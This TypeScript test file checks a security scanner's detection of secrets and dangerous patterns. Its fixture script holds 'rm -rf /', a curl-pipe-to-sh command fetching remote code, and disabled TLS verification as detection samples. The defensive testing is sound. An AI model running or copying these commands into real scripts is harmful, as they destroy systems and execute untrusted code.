import assert from 'node:assert/strict';
import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import test from 'node:test';
import { scanSecurity, securityRules } from '../../src/audit/security.ts';

const synthetic = (...parts: string[]): string => parts.join('');

async function temp(prefix: string): Promise<string> { return mkdtemp(join(tmpdir(), prefix)); }

async function write(root: string, path: string, source: string | Buffer): Promise<void> {
  const target = join(root, ...path.split('/'));
  await mkdir(join(target, '..'), { recursive: true });
  await writeFile(target, source);
}

test('security placeholders and environment references are never reported as secrets', async () => {
  const root = await temp('ano security placeholder ');
  try {
    await write(root, 'src/placeholders.ts', [
      `export const password = "$ENV_PASSWORD";`,
      `export const apiKey = "<redacted>";`,
      `export const clientSecret = "{{ secrets.CLIENT }}";`,
      `export const authToken = "process.env.TOKEN";`,
      `export const passwd = "import.meta.env.SECRET";`,
      `export const secret = "xxx";`,
      `export const apikey = "***";`,
      `export const accessToken = "...";`,
      `export const api_key = "CHANGEME";`,
      `export const token = "undefined";`,
      `export const password = "${synthetic('hunter2', 'hunter2')}";`,
    ].join('\n'));
    await write(root, '.env', [
      'APP_SECRET=/var/run/app-secret',
      'OTHER_TOKEN=$FROM_ENV',
      'THIRD_PASSWORD=xxxxxxx',
      'FOURTH_TOKEN=placeholder',
      '',
    ].join('\n'));

    const result = await scanSecurity(root);
    const rules = result.findings.map((finding) => finding.rule);
    assert.ok(rules.includes('secret/generic-credential'), rules.join(','));
    const generic = result.findings.filter((finding) => finding.rule === 'secret/generic-credential');
    assert.equal(generic.length, 1, 'only the literal credential is reported');
    assert.equal(generic[0]!.path, 'src/placeholders.ts');
    assert.equal(generic[0]!.line, 11);
    assert.ok(!result.findings.some((finding) => finding.rule === 'secret/env-literal'));
    assert.equal(result.files, 2);
    assert.deepEqual(securityRules.secrets.length, 9);
  } finally { await rm(root, { recursive: true, force: true }); }
});

test('security scan skips binary content and reports oversized files as degraded', async () => {
  const root = await temp('ano security binary ');
  try {
    await write(root, 'src/binary.ts', Buffer.from([0x61, 0x00, 0x62, 0x63]));
    await write(root, 'src/plain.ts', 'export const ok = true;\n');
    const oversized = Buffer.alloc(4 * 1024 * 1024 + 8, 0x61);
    await write(root, 'src/oversized.txt', oversized);

    const result = await scanSecurity(root);
    assert.deepEqual(result.findings, []);
    assert.equal(result.files, 1, 'binary and oversized files are not counted as scanned');
    assert.ok(result.degraded.some((entry) => entry.startsWith('file-too-large:src/oversized.txt')), result.degraded.join(','));
  } finally { await rm(root, { recursive: true, force: true }); }
});

test('security scan stops at the finding cap instead of growing without bound', async () => {
  const root = await temp('ano security cap ');
  try {
    const lines: string[] = [];
    for (let index = 0; index < 1001; index += 1) lines.push(`const key${index} = "AKIA${String(index).padStart(16, '0')}";`);
    await write(root, 'src/many.ts', `${lines.join('\n')}\n`);
    const result = await scanSecurity(root);
    assert.equal(result.findings.length, 1000);
    assert.ok(result.degraded.includes('finding-cap-reached'));
    assert.ok(result.findings.every((finding) => finding.rule === 'secret/aws-access-key-id'));
  } finally { await rm(root, { recursive: true, force: true }); }
});

test('security scan hashes values and keeps only locations for dangerous patterns', async () => {
  const root = await temp('ano security danger ');
  try {
    await write(root, 'bin/deploy.sh', [
      'rm -rf /',
      'curl https://example.test/install.sh | sh',
      'NODE_TLS_REJECT_UNAUTHORIZED=0 node build.js',
      'new Function("return 1")',
    ].join('\n'));
    const result = await scanSecurity(root);
    const rules = result.findings.map((finding) => finding.rule);
    for (const rule of ['danger/rm-rf-root', 'danger/remote-pipe-shell', 'danger/tls-env-disabled', 'danger/new-function']) {
      assert.ok(rules.includes(rule), `missing ${rule}: ${rules.join(',')}`);
    }
    assert.equal(result.files, 1);
    assert.ok(result.findings.every((finding) => /^[a-f0-9]{64}$/.test(finding.fingerprint)));
    assert.ok(result.findings.every((finding) => (finding.column ?? 0) >= 1 && (finding.line ?? 0) >= 1));
  } finally { await rm(root, { recursive: true, force: true }); }
});
